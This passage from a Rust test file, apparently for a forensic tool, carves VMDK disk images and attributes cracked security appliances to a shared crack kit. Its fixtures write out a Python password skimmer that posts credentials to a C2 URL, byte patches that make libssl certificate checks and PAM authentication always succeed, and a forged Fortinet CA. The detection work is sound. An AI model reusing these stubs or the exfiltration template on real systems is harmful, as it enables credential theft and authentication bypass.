    stream_markers.extend_from_slice(&(zlib_grain.len() as u32).to_le_bytes());
    stream_markers.extend_from_slice(&zlib_grain);
    while stream_markers.len() % 512 != 0 {
        stream_markers.push(0);
    }
    // End-of-stream marker (`val=0`, `size=0`, `type=0`)
    let mut eos = [0u8; 512];
    eos[0..16].fill(0);
    stream_markers.extend_from_slice(&eos);

    let desc = "# Disk DescriptorFile\nversion=1\nCID=12345678\nparentCID=ffffffff\ncreateType=\"streamOptimized\"\n";
    let vmdk_stream = build_vmdk4_sparse_extent(
        desc,
        1,        // COMPRESS_DEFLATE
        0x30001,  // compressed grains + stream markers
        128,
        &stream_markers,
    );

    let report =
        carve_disk_stream("streamopt.vmdk", Cursor::new(&vmdk_stream), &[]).expect("carve ok");
    assert_eq!(report.format_detected, "vmdk_stream_optimized_deflate");
    assert!(report.decompressed_grains_count >= 1);
    assert_eq!(report.pg_controls.len(), 1);
    assert_eq!(
        report.pg_controls[0].birthmark.system_identifier,
        8_888_777_766_665_555_444
    );
    assert!(report.pg_controls[0].birthmark.crc32c_valid);
}

// ============================================================================
// Test 3: Multi-Institution Crack-Kit DNA Attribution (`CKIT-SHA256-...`)
// ============================================================================

/// Populates an independently installed appliance root directory cracked by "Toolkit Phantom-X".
#[allow(clippy::too_many_arguments)]
fn populate_cracked_institution_root(
    root: &Path,
    hostname: &str,
    pg_sys_id: u64,
    ca_serial: &[u8],
    not_before_utc: &[u8],
    not_after_utc: &[u8],
    spki_seed: u8,
    pyc_mtime: u32,
    c2_url: &str,
) {
    fs::create_dir_all(root.join("etc/pki/ca-trust/source/anchors")).unwrap();
    fs::create_dir_all(root.join("usr/lib64/security")).unwrap();
    fs::create_dir_all(root.join("var/lib/pgsql/13/data/global")).unwrap();
    fs::create_dir_all(root.join("opt/cyops-licensing/__pycache__")).unwrap();
    fs::create_dir_all(root.join("opt/cyops-integrations/integrations/connectors/ad_1_0_0"))
        .unwrap();

    fs::write(root.join("etc/hostname"), format!("{}\n", hostname)).unwrap();
    fs::write(root.join("etc/timezone"), "Europe/Istanbul\n").unwrap();

    // Distinct PostgreSQL `pg_control` per institution!
    let pg = build_pg_control_8192(pg_sys_id, 1_720_000_000);
    fs::write(root.join("var/lib/pgsql/13/data/global/pg_control"), pg).unwrap();

    // Automated crack script patches `libssl.so.3` (`CET_ENDBR64_MOV_EAX_1_RET`) and
    // `pam_unix.so` (`CET_ENDBR64_XOR_EAX_EAX_RET`)
    let libssl = build_elf64_shared_object(&[(
        "X509_verify_cert",
        &[0xf3, 0x0f, 0x1e, 0xfa, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3],
    )]);
    fs::write(root.join("usr/lib64/libssl.so.3"), libssl).unwrap();

    let pam_unix = build_elf64_shared_object(&[(
        "pam_sm_authenticate",
        &[0xf3, 0x0f, 0x1e, 0xfa, 0x31, 0xc0, 0xc3],
    )]);
    fs::write(root.join("usr/lib64/security/pam_unix.so"), pam_unix).unwrap();

    // Automated `openssl req -x509 -days 3650 -subj "/O=Fortinet/CN=fortinet-ca2"` run:
    // Different RSA key (`spki_seed`), different random 8B serial (`ca_serial`), and different
    // calendar dates (`not_before_utc`..`not_after_utc`), but IDENTICAL 3650d + `O->CN` DNA!
    let ca_der = build_custom_x509_der(
        ca_serial,
        "Fortinet",
        "fortinet-ca2",
        true,
        not_before_utc,
        not_after_utc,
        true,
        spki_seed,
    );
    fs::write(
        root.join("etc/pki/ca-trust/source/anchors/fortiguard_local.crt"),
        der_to_pem(&ca_der),
    )
    .unwrap();

    // Recompiled `.pyc` (`return True`) at different unaligned wall-clock timestamp
    fs::write(
        root.join("opt/cyops-licensing/__pycache__/validator.cpython-311.pyc"),
        build_pep552_pyc311_return_true(pyc_mtime),
    )
    .unwrap();

    // Same skimmer Python template (`def _sync_health_telemetry(config):`), even with different C2 IP!
    let skimmer_py = format!(
        "import requests\ndef _sync_health_telemetry(config):\n    tok = config.get('password')\n    requests.post('{}', json={{'pw': tok}})\n",
        c2_url
    );
    fs::write(
        root.join("opt/cyops-integrations/integrations/connectors/ad_1_0_0/operations.py"),
        skimmer_py,
    )
    .unwrap();
}

#[test]
fn test_multi_institution_cracker_kit_dna_clustering_with_distinct_pg_control_ids() {
    let work = temp_test_dir("crack_kit_dna");
    let bank_alpha = work.join("bank_alpha_root");
    let hospital_beta = work.join("hospital_beta_root");
    let rival_gamma = work.join("rival_gamma_root");
    let clean_delta = work.join("clean_delta_root");
    let peer_dir = work.join("peers");
    fs::create_dir_all(&peer_dir).unwrap();

    // Institution A (`Bank_Alpha`): cracked 2025-03-01 (`pg_id = 7100000000000000101`)
    populate_cracked_institution_root(
        &bank_alpha,
        "soar-bank-alpha",
        7_100_000_000_000_000_101,
        &[0x41, 0x92, 0xa0, 0xcc, 0x11, 0x22, 0x33, 0x44],
        b"250301120000Z",
        b"350227120000Z", // exact 3650 days
        0x11,
        1_740_830_533, // unaligned epoch
        "https://198.51.100.10/collect",
    );

    // Institution B (`Hospital_Beta`): fresh OS/PostgreSQL install 8 months later (`pg_id = 7999999999999999888`)
    populate_cracked_institution_root(
        &hospital_beta,
        "soar-hospital-beta",
        7_999_999_999_999_999_888,
        &[0x7a, 0x19, 0xfe, 0x04, 0x99, 0x88, 0x77, 0x66],
        b"251110083000Z",
        b"351108083000Z", // exact 3650 days
        0x77,
        1_762_763_419, // different unaligned epoch
        "https://203.0.113.250/gate",
    );

    // Export Institution B's attribution report into `peer_dir/hospital_beta.json`
    let beta_suite = execute_ova_attribution_suite(
        &OvaAttributionConfig {
            ova_path: None,
            root_path: Some(hospital_beta.clone()),
            attribute_cracker: true,
            org_label: Some("Hospital_Beta".to_string()),
            cluster_input_path: None,
            extra_fortinet_spkis: Vec::new(),
        },
        None,
    )
    .unwrap();
    let beta_sig = beta_suite
        .attribution
        .as_ref()
        .unwrap()
        .local_node
        .dna
        .crack_kit_signature_id
        .clone()
        .expect("Hospital_Beta must produce CKIT-SHA256 signature");
    assert!(beta_sig.starts_with("CKIT-SHA256-"));

    fs::write(
        peer_dir.join("hospital_beta.json"),
        beta_suite.into_canonical_json().to_json_string(true),
    )
    .unwrap();

    // Institution C (`Rival_Gamma`): cracked by a DIFFERENT cracker toolkit (raw `mov eax, 1; ret`
    // without `endbr64` + 365-day `CN->O` CA) -> MUST NOT false-match `beta_sig`!
    fs::create_dir_all(rival_gamma.join("etc/pki/ca-trust/source/anchors")).unwrap();
    fs::create_dir_all(rival_gamma.join("usr/lib64")).unwrap();
    fs::write(
        rival_gamma.join("usr/lib64/libssl.so.3"),
        build_elf64_shared_object(&[("X509_verify_cert", &[0xb8, 0x01, 0x00, 0x00, 0x00, 0xc3])]),
    )
    .unwrap();
    let rival_ca = build_custom_x509_der(
        &[0x01],
        "Fortinet",
        "Rogue-OneYear",
        false, // CN->O order
        b"250101000000Z",
        b"260101000000Z", // 365 days
        true,
        0x99,
    );
    fs::write(
        rival_gamma.join("etc/pki/ca-trust/source/anchors/rival.crt"),
        der_to_pem(&rival_ca),
    )
    .unwrap();
    let rival_att =
        run_cracker_attribution_engine(Some(&rival_gamma), None, None, Some("Rival"), None, &[]);
    let rival_sig = rival_att
        .local_node
        .dna
        .crack_kit_signature_id
        .clone()
        .expect("rival signature");
    assert_ne!(
        rival_sig, beta_sig,
        "distinct cracker toolkits must produce distinct CKIT-SHA256 signatures"
    );

    // Clean factory baseline (`Clean_Delta`): MUST produce `None` signature and 0 findings!
    fs::create_dir_all(clean_delta.join("usr/lib64")).unwrap();
    let clean_prologue: &[u8] = &[0xf3, 0x0f, 0x1e, 0xfa, 0x41, 0x57, 0x41, 0x56, 0x55, 0x53];
    fs::write(
        clean_delta.join("usr/lib64/libssl.so.3"),
        build_elf64_shared_object(&[("X509_verify_cert", clean_prologue)]),
    )
    .unwrap();
    let clean_att =
        run_cracker_attribution_engine(Some(&clean_delta), None, None, Some("Clean"), None, &[]);
    assert!(clean_att.local_node.dna.crack_kit_signature_id.is_none());
    assert!(clean_att.findings.is_empty());

    // Correlate Institution A (`Bank_Alpha`) against `peer_dir` (`Hospital_Beta`)!
    let alpha_corr = run_cracker_attribution_engine(
        Some(&bank_alpha),
        None,
        None,
        Some("Bank_Alpha"),
        Some(&peer_dir),
        &[],
    );
    let alpha_sig = alpha_corr
        .local_node
        .dna
        .crack_kit_signature_id
        .as_ref()
        .expect("Bank_Alpha CKIT-SHA256");

    assert_eq!(
        alpha_sig, &beta_sig,
        "Bank_Alpha and Hospital_Beta cracked by the same automated script MUST match identically"
    );
    assert_eq!(alpha_corr.peer_nodes_evaluated, 1);

    let same_kit_finding = alpha_corr
        .findings
        .iter()
        .find(|f| f.code == "CRITICAL_SAME_CRACKER_TOOLKIT_ATTRIBUTION")
        .expect("must emit CRITICAL_SAME_CRACKER_TOOLKIT_ATTRIBUTION");

    let finding_json = same_kit_finding.to_json_with_id("FSR-ATT-0001").to_json_string(false);
    assert!(finding_json.contains("\"independent_fresh_installs_proven\":true"));
    assert!(finding_json.contains("7100000000000000101"));
    assert!(finding_json.contains("7999999999999999888"));
    assert!(finding_json.contains(alpha_sig));

    let _ = fs::remove_dir_all(&work);
}
